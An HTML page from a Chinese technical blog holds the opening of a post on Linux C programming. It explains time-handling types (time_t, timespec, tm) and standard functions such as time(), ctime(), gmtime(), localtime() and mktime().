<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="韩乔落">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
        
        
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://jelasin.github.io/2025/01/23/c语言编程/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="前言如果你是一个刚开始学C语言的小白，那么这篇文章可能并不十分适合你（但结尾放了几个C语言的中小项目，感兴趣的同学可以跟着看一下），本文主要聚焦于C语言的一些陷阱和缺陷，我的本职工作是二进制安全研究，关于这些缺陷导致的致命问题也写了很多文章(Pwn系列)。本文讨论的主要包括指针问题，C的语法糖，线程安全问题，系统编程问题，建议的编程风格和习惯等内容。这里编程部分以利用为主，如果你想深究其原理请看">
<meta property="og:type" content="article">
<meta property="og:title" content="C语言编程">
<meta property="og:url" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/index.html">
<meta property="og:site_name" content="Jelasin">
<meta property="og:description" content="前言如果你是一个刚开始学C语言的小白，那么这篇文章可能并不十分适合你（但结尾放了几个C语言的中小项目，感兴趣的同学可以跟着看一下），本文主要聚焦于C语言的一些陷阱和缺陷，我的本职工作是二进制安全研究，关于这些缺陷导致的致命问题也写了很多文章(Pwn系列)。本文讨论的主要包括指针问题，C的语法糖，线程安全问题，系统编程问题，建议的编程风格和习惯等内容。这里编程部分以利用为主，如果你想深究其原理请看">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220112233881.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113446445.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114253555.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114356098.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220112327181.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113130101.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113221756.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114533148.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220115844667.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220120004292.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220120017977.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220133319520.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134042993.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134158438.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134613354.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250314172903564.png">
<meta property="article:published_time" content="2025-01-23T06:44:14.000Z">
<meta property="article:modified_time" content="2025-03-14T09:34:43.742Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220112233881.png">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-3333333333"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3333333333');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            C语言编程 | Jelasin
        
    </title>

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Chillax/chillax.css">

    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/css/build/tailwind.css">
    

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/GeistMono/geist-mono.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Geist/geist.css">
    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"jelasin.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":true,"id":"G-3333333333"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"“会当身由己，婉转入江湖”","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":null,"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Links":{"icon":"fa-regular fa-link","submenus":{"看雪":"https://bbs.kanxue.com/homepage-958172.htm","吾爱破解":"https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space","中国诗歌网":"https://www.zgshige.com/c/2022-04-13/21151100.shtml"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Essays":{"path":"/essays","icon":"fa-regular fa-comment"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"AI":{"path":"/AI","icon":"fa-brands fa-python"},"IOT":{"path":"/IOT","icon":"fas fa-network-wired"},"CTF":{"path":"/CTF","icon":"fa-solid fa-snowflake"},"Web":{"path":"/Web","icon":"fa-solid fa-shield"},"Linux":{"path":"/Linux","icon":"fa-brands fa-linux"},"Android":{"path":"/Android","icon":"fa-brands fa-android"},"Windows":{"path":"/Windows","icon":"fa-brands fa-windows"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":4}},"footerStart":"2023/9/20 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/favicon.ico" class="w-full h-full rounded-sm">
                </a>
            
            <a class="logo-title" href="/">
                
                Jelasin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-link fa-fw"></i>
                                    LINKS
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">
                                                    看雪
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">
                                                    吾爱破解
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">
                                                    中国诗歌网
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-Links"
                        >
                            <span>
                                LINKS
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">看雪</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">吾爱破解</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">中国诗歌网</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/essays"
                        >
                            <span>Essays</span>
                            <i class="fa-regular fa-comment fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories"
                        >
                            <span>Categories</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/AI"
                        >
                            <span>AI</span>
                            <i class="fa-brands fa-python fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/IOT"
                        >
                            <span>IOT</span>
                            <i class="fas fa-network-wired fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/CTF"
                        >
                            <span>CTF</span>
                            <i class="fa-solid fa-snowflake fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Web"
                        >
                            <span>Web</span>
                            <i class="fa-solid fa-shield fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Linux"
                        >
                            <span>Linux</span>
                            <i class="fa-brands fa-linux fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Android"
                        >
                            <span>Android</span>
                            <i class="fa-brands fa-android fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Windows"
                        >
                            <span>Windows</span>
                            <i class="fa-brands fa-windows fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">40</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">121</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">C语言编程</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/touxiang.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">韩乔落</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-01-23 14:44:14</span>
        <span class="mobile">2025-01-23 14:44:14</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-03-14 17:34:43</span>
            <span class="mobile">2025-03-14 17:34:43</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你是一个刚开始学C语言的小白，那么这篇文章可能并不十分适合你（但结尾放了几个C语言的中小项目，感兴趣的同学可以跟着看一下），本文主要聚焦于C语言的一些陷阱和缺陷，我的本职工作是二进制安全研究，关于这些缺陷导致的致命问题也写了很多文章(Pwn系列)。本文讨论的主要包括指针问题，C的语法糖，线程安全问题，系统编程问题，建议的编程风格和习惯等内容。这里编程部分以利用为主，如果你想深究其原理请看 《Linux环境编程与内核》以及《Linux内核分析》系列文章。</p>
<p>本文只探讨在Linux环境下的C语言编程。</p>
<h2 id="Linux-C-时间处理"><a href="#Linux-C-时间处理" class="headerlink" title="Linux C 时间处理"></a>Linux C 时间处理</h2><h3 id="格林尼治时间"><a href="#格林尼治时间" class="headerlink" title="格林尼治时间"></a>格林尼治时间</h3><p>所有的UNIX系统都使用同一个时间和日期的起点：格林尼治时间（GMT）1970年1月1 日午夜（0点）。这是“UNIX纪元的起点”，Linux也不例外。Linux系统中所有的时间都以从那时起经过的秒数来衡量</p>
<p>在 Linux C 编程中，处理时间和日期相关的操作通常需要使用一些标准库函数。以下是关于时间处理的相关函数的详细讲解：</p>
<h3 id="时间数据类型"><a href="#时间数据类型" class="headerlink" title="时间数据类型"></a>时间数据类型</h3><h4 id="time-t"><a href="#time-t" class="headerlink" title="time_t"></a><code>time_t</code></h4><p>在处理时间时，最常使用的数据类型是<code>time_t</code>。它通常用于表示从1970年1月1日UTC时间（也称为Unix纪元）开始的秒数。</p>
<ul>
<li>时间通过一个预定义的类型time_t来处理，我们称time_t表示的时间成为<strong>日历时间</strong></li>
<li>这是一个大到能够容纳以秒计算的日期和时间的整数类型，它代表从<strong>格林尼治时间开始截止到目前为止的时间秒数</strong></li>
<li>在Linux系统中，它是一个<strong>长整型</strong>，与处理时间值的函数一起定义在头文件<code>time.h</code>中</li>
</ul>
<hr>
<h4 id="struct-timespec"><a href="#struct-timespec" class="headerlink" title="struct timespec"></a><code>struct timespec</code></h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> &#123;</span></span><br><span class="line">    <span class="type">time_t</span> tv_sec;   <span class="comment">// 秒</span></span><br><span class="line">    <span class="type">long</span>   tv_nsec;  <span class="comment">// 纳秒</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>timespec结构体按照<strong>秒和纳秒</strong>来定义时间</p>
<ul>
<li>结构体中至少包含以上两个成员：   <ul>
<li><strong>tv_sec：秒数</strong></li>
<li><strong>tv_nsec：纳秒</strong></li>
</ul>
</li>
<li>timespec结构体提供了更高精度的时间戳</li>
</ul>
<hr>
<h4 id="struct-tm"><a href="#struct-tm" class="headerlink" title="struct tm"></a><code>struct tm</code></h4><p><code>tm</code>结构体包含以下字段：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> tm_sec;   <span class="comment">// 秒数 [0, 60]</span></span><br><span class="line">    <span class="type">int</span> tm_min;   <span class="comment">// 分钟数 [0, 59]</span></span><br><span class="line">    <span class="type">int</span> tm_hour;  <span class="comment">// 小时数 [0, 23]</span></span><br><span class="line">    <span class="type">int</span> tm_mday;  <span class="comment">// 月中的第几天 [1, 31]</span></span><br><span class="line">    <span class="type">int</span> tm_mon;   <span class="comment">// 第几个月 [0, 11]</span></span><br><span class="line">    <span class="type">int</span> tm_year;  <span class="comment">// 年份，从1900年开始</span></span><br><span class="line">    <span class="type">int</span> tm_wday;  <span class="comment">// 星期几 [0, 6]，星期天为0</span></span><br><span class="line">    <span class="type">int</span> tm_yday;  <span class="comment">// 年中的第几天 [0, 365]</span></span><br><span class="line">    <span class="type">int</span> tm_isdst; <span class="comment">// 夏令时标志</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>tm_sec：</strong>其范围超过59是因为其允许临时表示润秒（Single UNIX Specification的以前版本允许双润秒，所以该字段的范围为<code>0~61</code>，但是UTC的正式定义不允许双润秒，所以现在该字段的范围为<code>0~60</code>）</li>
<li>除了月日字段，其他字段都是以0开始</li>
<li><strong>tm_isdest：</strong>如果夏令时生效，则该字段值为正；如果为非夏令时时间，则该字段值为0；如果此信息不可用，则其值为负</li>
</ul>
<h3 id="时间处理函数"><a href="#时间处理函数" class="headerlink" title="时间处理函数"></a>时间处理函数</h3><h4 id="time"><a href="#time" class="headerlink" title="time()"></a><code>time()</code></h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">time_t</span> <span class="title function_">time</span><span class="params">(<span class="type">time_t</span> *tloc)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>功能：返回当前时间，从1970年1月1日开始的秒数。</li>
<li>参数：<code>tloc</code>如果不是<code>NULL</code>，则当前时间也会存储在指向的内存位置。</li>
<li>返回值：当前时间以<code>time_t</code>格式。</li>
</ul>
<h4 id="ctime"><a href="#ctime" class="headerlink" title="ctime()"></a><code>ctime()</code></h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">ctime</span><span class="params">(<span class="type">const</span> <span class="type">time_t</span> *timep)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>功能：将时间值转换为本地时间的字符串表示。</li>
<li>参数：指向<code>time_t</code>类型的指针。</li>
<li>返回值：指向静态字符串的指针，格式通常为“Wed Jun 30 21:49:08 1993\n”。</li>
</ul>
<h4 id="gmtime-localtime"><a href="#gmtime-localtime" class="headerlink" title="gmtime()&#x2F;localtime()"></a><code>gmtime()</code>&#x2F;<code>localtime()</code></h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> tm *<span class="title function_">gmtime</span><span class="params">(<span class="type">const</span> <span class="type">time_t</span> *timep)</span>;</span><br><span class="line"><span class="keyword">struct</span> tm *<span class="title function_">localtime</span><span class="params">(<span class="type">const</span> <span class="type">time_t</span> *timep)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>功能：将<code>time_t</code>格式的时间转换为<code>tm</code>结构体，分别表示UTC时间和本地时间。</li>
<li>返回值：指向<code>tm</code>结构体的指针，该结构体包含了详细的时间信息。</li>
</ul>
<h4 id="mktime"><a href="#mktime" class="headerlink" title="mktime()"></a><code>mktime()</code></h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">time_t</span> <span class="title function_">mktime</span><span class="params">(<span class="keyword">struct</span> tm *tm)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>功能：将<code>tm</code>结构体转换为<code>time_t</code>格式。</li>
<li>参数：指向<code>tm</code>结构体的指针。</li>
<li>返回值：表示时间的<code>time_t</code>值。</li>
</ul>
